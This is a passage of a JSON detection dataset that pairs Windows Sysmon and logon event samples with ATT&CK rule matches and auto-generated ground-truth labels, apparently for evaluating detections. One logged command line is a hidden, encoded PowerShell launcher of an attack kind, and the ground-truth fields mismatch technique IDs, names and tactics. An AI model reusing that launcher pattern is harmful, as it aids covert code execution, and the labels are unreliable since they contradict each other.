          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 24534,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:45:40.009000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183615\\GuestAgent\\WindowsAzureGuestAgent.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "System Network Configuration Discovery",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1016)"
    },
    {
      "group_id": "T1021_002_22879",
      "rule_technique_id": "T1021.002",
      "rule_technique_name": "SMB/Windows Admin Shares",
      "confidence": 0.67,
      "anchor": {
        "idx": 22879,
        "EventID": 4624,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:45:38.894000+00:00"
      },
      "num_events": 46,
      "event_id_distribution": {
        "4624": 19,
        "11": 18,
        "18": 5,
        "4648": 4
      },
      "sample_logs": [
        {
          "idx": 19474,
          "EventID": 18,
          "TimeCreated": "2020-09-04 20:45:30.221000+00:00",
          "Image": "C:\\windows\\system32\\LogonUI.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19651,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.227000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19659,
          "EventID": 18,
          "TimeCreated": "2020-09-04 20:45:30.227000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19665,
          "EventID": 18,
          "TimeCreated": "2020-09-04 20:45:30.227000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19812,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.230000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19874,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.232000+00:00",
          "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19932,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.234000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 19934,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.234000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 20163,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:45:30.502000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 20194,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:45:30.503000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 20351,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:45:30.506000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 20330,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:45:30.506000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 20556,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:30.718000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 21582,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:45:38.219000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 21840,
          "EventID": 4624,
          "TimeCreated": "2020-09-04 20:45:38.224000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "SMB/Windows Admin Shares",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1021.002)"
    },
    {
      "group_id": "T1021_003_15136",
      "rule_technique_id": "T1021.003",
      "rule_technique_name": "Distributed Component Object Model",
      "confidence": 1.0,
      "anchor": {
        "idx": 15136,
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\wermgr.exe",
        "CommandLine": "C:\\windows\\system32\\wermgr.exe -upload",
        "TimeCreated": "2020-09-04 20:45:15.390000+00:00"
      },
      "num_events": 1801,
      "event_id_distribution": {
        "7": 1600,
        "12": 143,
        "13": 24,
        "3": 16,
        "22": 6,
        "17": 5,
        "1": 3,
        "11": 2,
        "9": 1,
        "18": 1
      },
      "sample_logs": [
        {
          "idx": 9882,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.892000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9884,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.895000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9886,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.895000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9889,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.896000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9894,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.900000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9895,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.900000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9897,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.900000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9899,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.901000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9901,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.902000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9904,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:05.903000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9905,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:06.897000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9906,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:06.898000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9907,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:06.898000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9917,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:06.901000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 9919,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:45:06.904000+00:00",
          "Image": "C:\\Windows\\System32\\logman.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Distributed Component Object Model",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": false,
      "gt_notes": "auto: noise:no-kw,rule!=fam(T1021.003)"
    },
    {
      "group_id": "T1027_77312",
      "rule_technique_id": "T1027",
      "rule_technique_name": "Obfuscated Files or Information",
      "confidence": 1.0,
      "anchor": {
        "idx": 77312,
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBJAE8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAFIAUwBpAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJAA2ADgAN",
        "TimeCreated": "2020-09-04 20:48:39.593000+00:00"
      },
      "num_events": 615,
      "event_id_distribution": {
        "12": 271,
        "7": 246,
        "4103": 51,
        "11": 21,
        "13": 6,
        "600": 6,
        "1": 4,
        "23": 2,
        "3": 2,
        "22": 2,
        "18": 1,
        "400": 1,
        "4104": 1,
        "17": 1
      },
      "sample_logs": [
        {
          "idx": 76629,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.244000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256"
        },
        {
          "idx": 76630,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.244000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256\\Terminator"
        },
        {
          "idx": 76631,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.245000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256\\Reason"
        },
        {
          "idx": 76632,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.245000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\TermReason\\7256\\CreationTime"
        },
        {
          "idx": 76634,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.246000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager"
        },
        {
          "idx": 76636,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.247000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager"
        },
        {
          "idx": 76637,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.247000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory"
        },
        {
          "idx": 76639,
          "EventID": 13,
          "TimeCreated": "2020-09-04 20:48:31.248000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory\\Microsoft.Windows.Cor"
        },
        {
          "idx": 76638,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.248000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory\\Microsoft.Windows.Cor"
        },
        {
          "idx": 76640,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.249000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        },
        {
          "idx": 76641,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.249000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        },
        {
          "idx": 76642,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.250000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        },
